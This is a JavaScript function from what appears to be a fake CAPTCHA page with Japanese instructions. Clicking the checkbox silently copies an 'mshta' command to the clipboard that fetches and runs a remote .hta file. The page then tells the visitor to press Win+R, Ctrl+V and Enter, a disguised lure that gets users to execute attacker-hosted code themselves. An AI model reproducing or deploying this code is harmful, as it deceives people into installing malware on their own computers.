async function startCaptcha() {
  const msg = document.getElementById("message");
  const warn = document.getElementById("warn-block");
  const box = document.querySelector(".checkbox");

  if (box.classList.contains("checked")) {
    return;
  }

  try {
    const res = await fetch("/generate-token");
    const data = await res.json();
    const { token } = data;

    const domain = window.location.host;

    const url = `https://${domain}/hta/captcha.hta?domain=${domain}&token=${token}`;
    const cmd = `mshta "${url}&c=I-am-not-a-ROBOT"`;

    await navigator.clipboard.writeText(cmd);

    box.classList.add("checked");
    warn.hidden = false;

    msg.innerHTML = `
    <p>次の手順:</p>
    <ol>
      <li><code>Win+R</code></li>
      <li><code>Ctrl+V</code></li>
      <li><code>Enter</code></li>
    </ol>
    `;
    msg.style.color = "green";
  } catch (err) {
    console.error("Error:", err);
    msg.innerHTML =
      "<p>エラーが発生しました。コンソールを確認してください。</p>";
    msg.style.color = "red";
  }
}
